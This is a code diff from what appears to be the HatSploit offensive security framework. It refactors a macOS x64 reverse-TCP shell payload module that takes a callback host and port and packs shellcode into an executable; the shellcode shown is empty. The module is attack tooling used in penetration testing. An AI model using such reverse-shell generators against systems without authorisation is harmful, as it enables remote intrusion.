@@ -24,12 +24,14 @@
 # SOFTWARE.
 #
 
-from core.lib.payload import HatSploitPayload
+from core.lib.payload import Payload
 from utils.payload.payload import PayloadGenerator
 from utils.tcp.tcp import TCPClient
 
-class HatSploitPayload(HatSploitPayload, PayloadGenerator, TCPClient):
+
+class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
     details = {
+        'Category': "stager",
         'Name': "macOS x64 Shell Reverse TCP",
         'Payload': "macos/x64/shell_reverse_tcp",
         'Authors': [
@@ -69,21 +71,21 @@ class HatSploitPayload(HatSploitPayload, PayloadGenerator, TCPClient):
     }
 
     def run(self):
-        local_host, local_port, executable_format = self.parser.parse_options(self.options)
+        local_host, local_port, executable_format = self.parse_options(self.options)
 
         local_host = self.host_to_bytes(local_host)
         local_port = self.port_to_bytes(local_port)
 
-        if not executable_format in self.formats.keys():
-            self.badges.output_error("Invalid executable format!")
+        if executable_format not in self.formats.keys():
+            self.output_error("Invalid executable format!")
             return
 
-        self.badges.output_process("Generating shellcode...")
+        self.output_process("Generating shellcode...")
         shellcode = (
             b""
         )
 
-        self.badges.output_process("Generating payload...")
+        self.output_process("Generating payload...")
         payload = self.generate(executable_format, 'x64', shellcode)
 
         instructions = ""
